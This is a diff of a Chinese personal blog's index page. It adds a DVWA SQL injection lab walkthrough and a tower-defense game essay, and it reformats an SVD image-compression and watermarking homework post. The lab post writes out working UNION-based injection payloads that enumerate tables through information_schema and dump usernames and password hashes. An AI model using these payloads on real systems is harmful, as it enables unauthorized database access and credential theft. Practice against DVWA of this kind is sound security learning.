@@ -149,6 +149,195 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://bmcastle.club/2022/07/30/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="NightRyu">
+      <meta itemprop="description" content="NightRyu的博客，偶尔会发一些学习笔记和杂谈">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NightRyu的城堡">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/07/30/SQL%E6%B3%A8%E5%85%A5%E5%AE%9E%E9%AA%8C/" class="post-title-link" itemprop="url">SQL注入实验</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-07-30 23:22:25" itemprop="dateCreated datePublished" datetime="2022-07-30T23:22:25+08:00">2022-07-30</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-02-07 23:36:28" itemprop="dateModified" datetime="2023-02-07T23:36:28+08:00">2023-02-07</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="使用burp进行抓包，从而实现对目标的SQL注入。"><a href="#使用burp进行抓包，从而实现对目标的SQL注入。" class="headerlink" title="使用burp进行抓包，从而实现对目标的SQL注入。"></a>使用burp进行抓包，从而实现对目标的SQL注入。</h1><p>从客户端向服务器发出请求，并由burp截取</p>
+<p><img src=SQL.png style="" alt="SQL" align=center /></img> </p>
+<p>在burp中检查数据包并构造SQL语句，测试能否进行SQL注入。</p>
+<pre><code>1 or 1=1#
+</code></pre>
+<p><img src=Burp1.png style="" alt="Burp1" align=center /></img> </p>
+<p>发送到服务器，得到结果。</p>
+<p><img src=Burp2.png style="" alt="Burp2" align=center /></img></p>
+<p>说明目标可以被SQL注入，为数字型注入。</p>
+<p><img src=Burp3.png style="" alt="Burp3" align=center /></img></p>
+<h1 id="爆破库名"><a href="#爆破库名" class="headerlink" title="爆破库名"></a>爆破库名</h1><p>利用order by语句测试当前表列数目</p>
+<pre><code>1 order by 1#
+</code></pre>
+<p><img src=order1.png style="" alt="order1" align=center /></img></p>
+<pre><code>1 order by 2#
+</code></pre>
+<p><img src=order2.png style="" alt="order2" align=center /></img></p>
+<pre><code>1 order by 3#
+</code></pre>
+<p><img src=order3.png style="" alt="order3" align=center /></img></p>
+<p>可以推测出表有2列</p>
+<h1 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h1><pre><code>1 union select 1,database()#
+</code></pre>
+<p><img src=base.png style="" alt="base" align=center /></img><br>得到库名 dvwa</p>
+<h1 id="爆破表名"><a href="#爆破表名" class="headerlink" title="爆破表名"></a>爆破表名</h1><p>information_schema表存储了数据库中所有的表名和列名，可以利用搜索</p>
+<pre><code>1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
+</code></pre>
+<p><img src=table.png style="" alt="table" align=center /></img><br>得到两个表名</p>
+<pre><code>guestbook,users
+</code></pre>
+<h1 id="爆破列名"><a href="#爆破列名" class="headerlink" title="爆破列名"></a>爆破列名</h1><p>获取users 表字段名</p>
+<pre><code>1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273
+</code></pre>
+<p>由于引号’’会被转义，因此将users转为16进制来绕过转义</p>
+<p><img src=col.png style="" alt="col" align=center /></img></p>
+<p>得到users表中的列名</p>
+<pre><code>user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+</code></pre>
+<h1 id="爆破数据"><a href="#爆破数据" class="headerlink" title="爆破数据"></a>爆破数据</h1><pre><code>1 union select group_concat(user_id,first_name,last_name),group_concat(user,password) from users#
+</code></pre>
+<p><img src=data.png style="" alt="data" align=center /></img><br>获取到经md5加密后的密码和对应用户信息</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://bmcastle.club/2022/05/07/%E4%BB%8E%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%A1%94%E9%98%B2%E5%88%B0%E3%80%8A%E6%98%8E%E6%97%A5%E6%96%B9%E8%88%9F%E3%80%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="NightRyu">
+      <meta itemprop="description" content="NightRyu的博客，偶尔会发一些学习笔记和杂谈">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="NightRyu的城堡">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/05/07/%E4%BB%8E%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E5%A1%94%E9%98%B2%E5%88%B0%E3%80%8A%E6%98%8E%E6%97%A5%E6%96%B9%E8%88%9F%E3%80%8B/" class="post-title-link" itemprop="url">从最简单的塔防到《明日方舟》</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-07 23:13:00" itemprop="dateCreated datePublished" datetime="2022-05-07T23:13:00+08:00">2022-05-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-02-07 23:22:57" itemprop="dateModified" datetime="2023-02-07T23:22:57+08:00">2023-02-07</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="一、塔防游戏的发展"><a href="#一、塔防游戏的发展" class="headerlink" title="一、	塔防游戏的发展"></a>一、	塔防游戏的发展</h1><p>现代塔防游戏一般认为源自于《星际争霸》《帝国时代II》和《魔兽争霸III》的玩家自制地图。一个最简单的塔防游戏应该是这样的：如图所示，一条出现敌人的路径，在道路两侧有固定位置（也有不固定位置的类型）放置一定攻击范围的防御塔，利用防御塔的攻击阻止敌人到达路径的终点。如果玩家能够将每一波次的敌人全部在终点之前击杀，就可以获得这一局的最高评价。</p>
+<p><img src=从最简单的塔防到《明日方舟》\经典塔防模型.png style="" alt="经典塔防模型" align=center />经典塔防模型<br></img> </p>
+<p>从这种基础的玩法出发，塔防游戏通常会添加一些其它内容，例如造成法术伤害的防御塔和造成物理伤害的防御塔；仅攻击敌方单体的防御塔和攻击一定范围内敌人的防御塔；会降低敌人移动速度的防御塔等。同时，敌人的类型也会增多、增强。但是，游戏的总体思路仍然是阻止敌人到达终点，即玩家的最终目的是让所有防御塔的DPS大于敌人的血量和移动速度之比。保卫萝卜就是这样一款塔防游戏——它游戏中所有的防御塔只能攻击敌人或者降低敌人的移动速度，而敌人只能向终点奔去（终点を駆ける）。</p>
+<p><img src=从最简单的塔防到《明日方舟》\保卫萝卜.jpg style="" alt="保卫萝卜" align=center />保卫萝卜<br></img> </p>
+<p>而kingdom rush则与这种基本的塔防游戏有所不同。在kingdom rush一代中，游戏中设置了使用物理攻击的弓箭塔、法术攻击的巫师塔和范围攻击的炮塔。但与以往所有塔防游戏都不同的一点是，kingdom rush增加了兵营这种防御塔。兵营会在玩家设置的集结点处有三个士兵单位，这种单位可以在攻击敌人的同时，阻挡其它敌人前进的脚步，将敌人到达终点的时间延长——它在塔防游戏中引入了“阻挡”机制。这改变了塔防游戏的目标，玩家无需考虑如何提升DPS消灭敌人，而是考虑如何利用阻挡来给其它防御塔拉扯出良好的输出环境提高输出。用MMORPG的术语来说，就是游戏中有了战士\法师的角色分工。</p>
+<p><img src=从最简单的塔防到《明日方舟》\kr.PNG style="" alt="kr" align=center />Kingdom Rush<br></img> </p>
+<p>千年战争Aigis——DMM社的R18塔防页游<del>（偶尔会被认为是粥游的爹）</del>——则将Gacha（氪金抽卡）机制引入到了塔防游戏中来，这让运营者获得了一个新的从塔防游戏获利的角度。游戏中所有的防御塔都被替换成了有着不同的特性和技能的角色。这些角色无论是否直接接敌都有可能受到敌人造成的伤害，并因受到伤害而退场。与之相对的，千年战争引入了治疗者以及其它几个能给其他角色恢复生命的职业。它成功将战法牧铁三角体系融入到了塔防游戏中。至此，游玩塔防游戏的游戏思路中不仅仅要考虑敌人的进攻，还需要考虑角色使用技能的时机和角色生存所需的条件，若角色不能抗住敌人的进攻，会直接导致战线的崩溃和关卡的失败。毕竟，如果角色在关卡中死亡，在千年战争的关卡中同样不能获得最高游戏评价。</p>
+<p><img src=从最简单的塔防到《明日方舟》\千年战争AIGIS.jpg style="" alt="千年战争AIGIS" align=center />千年战争AIGIS<br></img> </p>
+<h1 id="二、回到明日方舟"><a href="#二、回到明日方舟" class="headerlink" title="二、	回到明日方舟"></a>二、	回到明日方舟</h1><h2 id="棋盘格、角色朝向和战斗"><a href="#棋盘格、角色朝向和战斗" class="headerlink" title="棋盘格、角色朝向和战斗"></a>棋盘格、角色朝向和战斗</h2><p>现在，让我们聊回明日方舟。明日方舟作为一款塔防游戏，在它诸多前辈的基础上添加了它独有的元素——地图棋盘格和朝向机制。地图的朝向机制让明日方舟的防御塔和其他游戏不同，只能攻击到自身某一个方向上攻击范围内的敌人。</p>
+<p><img src=从最简单的塔防到《明日方舟》\明日方舟1.jpg style="" alt="明日方舟" align=center />明日方舟<br></img> </p>
+<p>这就导致了明日方舟中的所有角色都无法攻击到自己背后的敌人——除非背后和敌人短兵相接。这就导致玩家需要考虑如何将高台角色攻击范围的收益最大化和对于空中敌人单位及时造成伤害，近卫干员是否需要利用面前额外的范围提前攻击暂时没有移动的敌人。</p>
+<p>另外，游戏中也有一些特殊的场地机制——例如活动“长夜临光”中城市霓虹机制——根据玩家角色朝向不同，场地呈现不同的状态，玩家做出的决策也因此有所不同。这种独有的机制让明日方舟的关卡拥有更多的可能性，让游戏变得更加“有趣”。</p>
+<h2 id="COST、战线展开与失败的“风投”体系"><a href="#COST、战线展开与失败的“风投”体系" class="headerlink" title="COST、战线展开与失败的“风投”体系"></a>COST、战线展开与失败的“风投”体系</h2><p>在塔防游戏中，通常都会利用cost机制来限制玩家放置防御塔。在保卫萝卜和kingdom rush中，是“金币”——放置防御塔会消耗金币，而击杀敌人会获得金币。在传统塔防中，通常都是如上的方式。虽然会有方法获得额外的金币，但是一局中能获得金币的总量是大体确定的。不过，通常一个关卡给予的所有资源足够玩家完成这一局游戏。</p>
+<p>而在植物大战僵尸这款相对非主流的塔防游戏中，cost被设计为阳光。在白天的关卡中，天上经过一定时间会掉落阳光，而向日葵则会提供额外的阳光。明日方舟的cost机制在一定程度上继承了这一点——所有cost均由稳定的自动获取的cost和先锋角色提供的额外cost两部分组成。这样的设计就带来了这样的情况——玩家在一局游戏中理论上能获得的cost数量无上限。这样，即使角色撤回或死亡有相对一局游戏时间较长的惩罚性CD和cost上升，玩家也能够利用无上限的cost重新展开战线抵挡敌人的攻击。</p>
+<p>这样无上限的资源和有尽头的关卡会十分的灵活。例如在一个Boss Rush关卡（指连续出现Boss敌人的关卡）中，玩家可以多次调整角色的站位来针对不同的Boss或者不同波次中敌人的不同配置。玩家可以在前方阵线遭到破坏后，敌人到达终点前重组阵线。</p>
+<p>但是，明日方舟中“风投”体系——风笛的天赋可以让先锋角色放置后更快使用技能，而 “投降”先锋（牺牲了释放技能时阻挡敌人的能力，换来短时间大量cost的先锋角色）在风笛的辅助下，可以在落地后迅速使用技能——尤其是桃金娘几乎在落地的瞬间使用技能——让制约玩家战线展开的限制几乎可以称得上不存在。通过风头体系快速获得大量cost的方式直接导致了其他先锋变成了相对可有可无的角色，整个先锋之间互相加成的体系变得十分的鸡肋，先锋之间相互辅助的战斗形式被玩家忽略了——既然我已经有了足够使用近卫、重装的费用，我何必用相对伤害更低的先锋呢？整个游戏中的先锋被分成了两类——“风投”和其他先锋。战斗早期用先锋产生cost并抵抗压力，然后逐渐展开整个战线的游戏玩法几乎可以说消失了。</p>
+<h2 id="波次、敌人以及为什么真银斩会这么强"><a href="#波次、敌人以及为什么真银斩会这么强" class="headerlink" title="波次、敌人以及为什么真银斩会这么强"></a>波次、敌人以及为什么真银斩会这么强</h2><p>在明日方舟中，游戏并不像保卫萝卜那样会有明确的波次提示，而是用敌人击杀数代替。玩家可以根据敌人的密度和强度将关卡大概分成几个波次——非压力波、压力波、高压波——这些波次可能会反复多次，随后关卡进入收尾阶段。然而如此划分并没有明确的标准——玩家甚至可以将所有敌人控制在地图上一次击杀，可是这真的能认为这个关卡只有这一波敌人吗。</p>
+<p>而不同的波次中通常会出现不同强度的敌人，关卡的进度逐渐接近尾声，敌人的强度也就越高，玩家就需要拿出更加具有针对性的阵型处理敌人的进攻。在同一关卡中，开始时敌人可能只需要狙击角色就能够造成足够的伤害；到中盘可能有高防御的敌人，需要术师角色使用无视防御的法术进行处理；到关卡收尾的部分，玩家更可能需要使用多个技能进行组合才能化解敌人的攻势。</p>
+<p>话又说回来，虽然有高压状态和非压状态的区分，明日方舟的关卡在塔防游戏的类型中关卡仍然是比较短的。同时大部分的关卡地图都比较小，这就让真银斩和火山这种范围比较大的群攻技能在处理高压波次时的表现十分亮眼。较大的范围让他们可以轻易攻击到较多的敌人，并且伤害也足够打破敌人的防御&#x2F;法术抗性来消灭敌人。这就让作为关卡难点的高压波次被轻易的得到化解。这就是为什么银灰作为开服角色，在关卡中仍然是常青树的原因。</p>
+<p>不过我要另外说一句，史尔特尔的黄昏与其它两个技能并不一样，它通过献祭了角色的持续站场能力，带来了短期的极高输出。由于数值策划用脚填写的技能数据，导致它只要不是在前期的非压力波次使用，都能获得足够的收益。同时，落地之后几乎立刻就能使用的特性，让这个技能更类似灵活的“战场救火队”——哪里战线被突破了，就用黄昏撑一下，从而拉扯出重建战线所需的时间——而银灰和艾雅法拉本身就能够作为战线的一部分存在。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://bmcastle.club/2022/04/16/%E5%9F%BA%E4%BA%8E%E5%A5%87%E5%BC%82%E5%80%BC%E5%88%86%E8%A7%A3%E7%9A%84%E5%9B%BE%E5%83%8F%E5%8E%8B%E7%BC%A9%E5%92%8C%E6%95%B0%E6%8D%AE%E9%9A%90%E8%97%8F-%E4%BD%9C%E4%B8%9A%EF%BC%88/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -180,7 +369,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-02-07 17:45:04" itemprop="dateModified" datetime="2023-02-07T17:45:04+08:00">2023-02-07</time>
+                <time title="修改时间：2023-02-07 23:09:55" itemprop="dateModified" datetime="2023-02-07T23:09:55+08:00">2023-02-07</time>
               </span>
 
           
@@ -195,64 +384,62 @@
 
       
           <p><del>不想研究数学公式相关的插件了，下次一定</del></p>
-<h1 id="矩阵的奇异值分解"><a href="#矩阵的奇异值分解" class="headerlink" title="矩阵的奇异值分解"></a>矩阵的奇异值分解</h1><p>奇异值分解(Singular Value Decomposition，以下简称SVD)是一种对于矩阵进行分解的算法。是对矩阵的特征值分解的进一步演化，不需要要求分解的矩阵是方阵。<br>我们定义矩阵A为m×n的矩阵，它的SVD为：  </p>
-<pre><code>A=UΣV^T 
+<h1 id="矩阵的奇异值分解"><a href="#矩阵的奇异值分解" class="headerlink" title="矩阵的奇异值分解"></a>矩阵的奇异值分解</h1><p>奇异值分解(Singular Value Decomposition，以下简称SVD)是一种对于矩阵进行分解的算法。是对矩阵的特征值分解的进一步演化，不需要要求分解的矩阵是方阵。</p>
+<p>我们定义矩阵A为m×n的矩阵，它的SVD为：</p>
+<pre><code>A=UΣV^T
 </code></pre>
-<p>其中U是一个m×m的矩阵，Σ是m×n的矩阵，除了主对角线上的值均为0，主对角线上每个元素都称为奇异值。U和V均满足  </p>
+<p>其中U是一个m×m的矩阵，Σ是m×n的矩阵，除了主对角线上的值均为0，主对角线上每个元素都称为奇异值。U和V均满足</p>
 <pre><code>U×U^T=I
 V×V^T=I
 </code></pre>
-<p>对于奇异值，与特征值类似，在奇异值矩阵中也是由大到小排列，并且减小的非常快，在很多情况下，前10%甚至1%就占到了全部奇异值之和的99%以上<br>因此，我们可以用最大的k个奇异值和对应的左右奇向量近似描述矩阵。</p>
+<p>对于奇异值，与特征值类似，在奇异值矩阵中也是由大到小排列，并且减小的非常快，在很多情况下，前10%甚至1%就占到了全部奇异值之和的99%以上</p>
+<p>因此，我们可以用最大的k个奇异值和对应的左右奇向量近似描述矩阵。</p>
 <h1 id="基于奇异值分解的图像压缩"><a href="#基于奇异值分解的图像压缩" class="headerlink" title="基于奇异值分解的图像压缩"></a>基于奇异值分解的图像压缩</h1><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>由奇异值快速下降的状态，我们可以将图片按照矩阵形式读取数据（如读取灰度图，或者读取彩色图并对它的各个颜色通道分别奇异值分解），并对其进行奇异值分解，通过舍弃较小奇异值的方式将图像在较小损失的情况下进行压缩。</p>
-<p><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\img.jpg style="" alt="示例图片1" align=center />示例图片 1<br></img></p>
+<p><img src=img.jpg style="" alt="示例图片1" align=center />示例图片 1<br></img><br>示例图片 1</p>
 <p>对其进行奇异值分解，并选择前0.5%，1%，5%，10%，20%，30%，50%，70%奇异值，观察压缩效果</p>
 <table>
 <thead>
 <tr>
 <th align="center">压缩比例</th>
-<th align="center">压缩效果</th>
+<th align="center">结果图片</th>
 </tr>
 </thead>
 <tbody><tr>
 <td align="center">0.5%</td>
-<td align="center"><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\0.005new.jpg style="" alt="0.5%" align=center /></img></td>
+<td align="center"><img src=0.005new.jpg style="" alt="0.5%" align=center /></img></td>
 </tr>
 <tr>
 <td align="center">1%</td>
-<td align="center"><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\0.01new.jpg style="" alt="1%" align=center /></img></td>
+<td align="center"><img src=0.015new.jpg style="" alt="1%" align=center /></img></td>
 </tr>
 <tr>
 <td align="center">5%</td>
-<td align="center"><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\0.05new.jpg style="" alt="5%" align=center /></img></td>
+<td align="center"><img src=0.05new.jpg style="" alt="5%" align=center /></img></td>
 </tr>
 <tr>
 <td align="center">10%</td>
-<td align="center"><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\0.1new.jpg style="" alt="10%" align=center /></img></td>
+<td align="center"><img src=0.1new.jpg style="" alt="10%" align=center /></img></td>
 </tr>
 <tr>
 <td align="center">20%</td>
-<td align="center"><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\0.2new.jpg style="" alt="20%" align=center /></img></td>
+<td align="center"><img src=0.2new.jpg style="" alt="20%" align=center /></img></td>
 </tr>
 <tr>
 <td align="center">30%</td>
-<td align="center"><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\0.3new.jpg style="" alt="30%" align=center /></img></td>
+<td align="center"><img src=0.3new.jpg style="" alt="30%" align=center /></img></td>
 </tr>
 <tr>
 <td align="center">50%</td>
-<td align="center"><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\0.5new.jpg style="" alt="50%" align=center /></img></td>
+<td align="center"><img src=0.5new.jpg style="" alt="50%" align=center /></img></td>
 </tr>
 <tr>
 <td align="center">70%</td>
-<td align="center"><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\0.7new.jpg style="" alt="70%" align=center /></img></td>
+<td align="center"><img src=0.7new.jpg style="" alt="70%" align=center /></img></td>
 </tr>
 </tbody></table>
 <p>可以看出，仅选取前10%奇异值时，图片仍没有较严重的模糊。到仅选择5%奇异值时，图片才出现了明显噪点；仅选择1%、0.5%奇异值时，图片已经无法正确辨认。即使用奇异值分解可以将图片压缩到一个较高的压缩度。<br>在网络中，可以选择仅传输部分奇异值的方法，向用户传输压制后的图片来降低服务器压力的同时让用户能看到较清晰的图片。</p>
-<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>使用python语言模拟实现SVD进行图片压缩</p>
-<pre><code>def chan_compress(mat, rate):
-    # 对单通道奇异值分解
-    u, sigma, vt = np.linalg.svd(mat)
-
-    row = u.shape[0]
+<h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>使用python语言模拟实现SVD进行图片压缩<br>    def chan_compress(mat, rate):<br>        # 对单通道奇异值分解<br>        u, sigma, vt &#x3D; np.linalg.svd(mat)</p>
+<pre><code>    row = u.shape[0]
     col = vt.shape[0]
     # 初始化一个 row × col 的全0矩阵
     new_mat = np.zeros((row, col))
@@ -279,16 +466,18 @@ def img_compress(img, rate):
     # 重建压缩后的图片
     img_new = np.stack((r_new, g_new, b_new), 2)
     Image.fromarray(np.uint8(img_new)).save(&quot;&#123;&#125;&quot;.format(rate)+&quot;new.jpg&quot;)
+
+    基于奇异值分解的数据隐藏
 </code></pre>
-<h1 id="基于奇异值分解的数据隐藏"><a href="#基于奇异值分解的数据隐藏" class="headerlink" title="基于奇异值分解的数据隐藏"></a>基于奇异值分解的数据隐藏</h1><h2 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h2><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>将原图像和水印进行SVD后，将得到的水印奇异值加到原图像SVD得到的Σ矩阵中，从而实现水印的嵌入。</p>
+<h2 id="实现原理-1"><a href="#实现原理-1" class="headerlink" title="实现原理"></a>实现原理</h2><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>将原图像和水印进行SVD后，将得到的水印奇异值加到原图像SVD得到的Σ矩阵中，从而实现水印的嵌入。</p>
 <h3 id="安全性分析"><a href="#安全性分析" class="headerlink" title="安全性分析"></a>安全性分析</h3><p>由奇异值的特性可以知道，隐藏在图片中的相关信息不会因为受到图片本身的压缩、扩张等情况影响到水印隐藏的效果。同时，我们可以通过打乱水印奇异值插入顺序的方法提升水印插入的安全性</p>
-<h2 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h2><h4 id="将sigma转化成m-n大小的对角矩阵"><a href="#将sigma转化成m-n大小的对角矩阵" class="headerlink" title="将sigma转化成m*n大小的对角矩阵"></a>将sigma转化成m*n大小的对角矩阵</h4><pre><code>def diagonal_mat(m, n, sigma):
+<h2 id="实现代码-1"><a href="#实现代码-1" class="headerlink" title="实现代码"></a>实现代码</h2><h3 id="将sigma转化成m-n大小的对角矩阵"><a href="#将sigma转化成m-n大小的对角矩阵" class="headerlink" title="将sigma转化成m*n大小的对角矩阵"></a>将sigma转化成m*n大小的对角矩阵</h3><pre><code>def diagonal_mat(m, n, sigma):
     v = np.zeros((m, n))
     for i in range(len(sigma)):
         v[i, i] = sigma[i]
     return v
 </code></pre>
-<h4 id="不同大小的矩阵相加，默认加在左上角的部分-水印插入左上角）"><a href="#不同大小的矩阵相加，默认加在左上角的部分-水印插入左上角）" class="headerlink" title="不同大小的矩阵相加，默认加在左上角的部分(水印插入左上角）"></a>不同大小的矩阵相加，默认加在左上角的部分(水印插入左上角）</h4><pre><code>def add_mat(a, b):
+<h3 id="不同大小的矩阵相加，默认加在左上角的部分-水印插入左上角）"><a href="#不同大小的矩阵相加，默认加在左上角的部分-水印插入左上角）" class="headerlink" title="不同大小的矩阵相加，默认加在左上角的部分(水印插入左上角）"></a>不同大小的矩阵相加，默认加在左上角的部分(水印插入左上角）</h3><pre><code>def add_mat(a, b):
     ma = a.shape[0]
     na = a.shape[1]
     mb = b.shape[0]
@@ -301,15 +490,13 @@ def img_compress(img, rate):
             if i &lt; mb and j &lt; nb:
                 c[i, j] += b[i, j]
     return c
-
-
-# 截取矩阵中左上角m*n的部分（从左上角提取水印）
-def extract_mat(a, m, n):
+</code></pre>
+<h3 id="截取矩阵中左上角m-n的部分（从左上角提取水印）"><a href="#截取矩阵中左上角m-n的部分（从左上角提取水印）" class="headerlink" title="截取矩阵中左上角m*n的部分（从左上角提取水印）"></a>截取矩阵中左上角m*n的部分（从左上角提取水印）</h3><pre><code>def extract_mat(a, m, n):
     assert(m &lt; a.shape[0] and n &lt; a.shape[1])
     b = a[:m, :n]
     return b
 </code></pre>
-<h4 id="插入水印"><a href="#插入水印" class="headerlink" title="插入水印"></a>插入水印</h4><pre><code>def mark_insert(img, mark):
+<h3 id="插入水印"><a href="#插入水印" class="headerlink" title="插入水印"></a>插入水印</h3><pre><code>def mark_insert(img, mark):
     # 将图片转化为灰度图（若要插入彩色水印，应对三个通道做相同处理）
     img.convert(&#39;L&#39;)
     mark.convert(&#39;L&#39;)
@@ -326,19 +513,21 @@ def extract_mat(a, m, n):
     Image.fromarray(np.uint8(img_new)).save(&quot;marked.jpg&quot;)
     return img_new
 </code></pre>
-<h4 id="再次向原图片插入原水印，若结果图片相同，说明水印插入成功"><a href="#再次向原图片插入原水印，若结果图片相同，说明水印插入成功" class="headerlink" title="再次向原图片插入原水印，若结果图片相同，说明水印插入成功"></a>再次向原图片插入原水印，若结果图片相同，说明水印插入成功</h4><pre><code>def is_marked(img, mark, marked):
+<h3 id="再次向原图片插入原水印，若结果图片相同，说明水印插入成功"><a href="#再次向原图片插入原水印，若结果图片相同，说明水印插入成功" class="headerlink" title="再次向原图片插入原水印，若结果图片相同，说明水印插入成功"></a>再次向原图片插入原水印，若结果图片相同，说明水印插入成功</h3><pre><code>def is_marked(img, mark, marked):
     img_mark = mark_insert(img, mark)
     marked_mat = numpy.ma.array(marked)
     if img_mark.all() == marked_mat.all():
         return True
     else:
         return False
+
+    完整实现代码
 </code></pre>
-<h1 id="完整实现代码"><a href="#完整实现代码" class="headerlink" title="完整实现代码"></a>完整实现代码</h1><h2 id="示例数据"><a href="#示例数据" class="headerlink" title="示例数据"></a>示例数据</h2><h3 id="图片压缩示例图片"><a href="#图片压缩示例图片" class="headerlink" title="图片压缩示例图片"></a>图片压缩示例图片</h3><p><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\img.jpg style="" alt="示例图片1" align=center />示例图片 1<br></img></p>
-<h3 id="数据隐藏实例灰度图片及水印"><a href="#数据隐藏实例灰度图片及水印" class="headerlink" title="数据隐藏实例灰度图片及水印"></a>数据隐藏实例灰度图片及水印</h3><p>示例图片：</p>
-<p><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\grey_img.jpg style="" alt="示例图片2" align=center /><br>示例图片2<br></img></p>
+<h2 id="示例数据"><a href="#示例数据" class="headerlink" title="示例数据"></a>示例数据</h2><h3 id="图片压缩示例图片"><a href="#图片压缩示例图片" class="headerlink" title="图片压缩示例图片"></a>图片压缩示例图片</h3><p><img src=img.jpg style="" alt="示例图片1" align=center />示例图片 1<br></img></p>
+<h3 id="数据隐藏实例灰度图片及水印"><a href="#数据隐藏实例灰度图片及水印" class="headerlink" title="数据隐藏实例灰度图片及水印"></a>数据隐藏实例灰度图片及水印</h3><p>示例图片： </p>
+<p><img src=grey_img.jpg style="" alt="示例图片2" align=center /><br>示例图片2<br></img></p>
 <p>示例水印：</p>
-<p><img src=基于奇异值分解的图像压缩和数据隐藏-作业（\mark.jpg style="" alt="示例水印" align=center /><br>示例水印<br></img></p>
+<p><img src=mark.jpg style="" alt="示例水印" align=center /><br>示例水印<br></img></p>
 <h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre><code>import numpy as np
 import numpy.ma
 from PIL import Image
@@ -394,7 +583,6 @@ def mark_insert(img, mark):
 
 
 # 再次向原图片插入原水印，若结果图片相同，说明水印插入成功
-
 def is_marked(img, mark, marked):
     img_mark = mark_insert(img, mark)
     marked_mat = numpy.ma.array(marked)
@@ -502,7 +690,7 @@ if __name__ == &quot;__main__&quot;:
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-02-07 16:57:11" itemprop="dateModified" datetime="2023-02-07T16:57:11+08:00">2023-02-07</time>
+                <time title="修改时间：2023-02-07 23:04:38" itemprop="dateModified" datetime="2023-02-07T23:04:38+08:00">2023-02-07</time>
               </span>
 
           
@@ -517,12 +705,12 @@ if __name__ == &quot;__main__&quot;:
 
       
           <p><del>这个系列也没写下去</del></p>
-<h1 id="Python中使用的列表"><a href="#Python中使用的列表" class="headerlink" title="Python中使用的列表"></a>Python中使用的列表</h1><p>创建格式：List &#x3D; [“Object1”,”Object2”,”Object3”]<br>Tips：无需声明类型——Python变量标识符没有类型。对于列表来说，数据项的类型并不重要。Python只需要知道给列表指定了名字，同时名字中包含有一些数据项。</p>
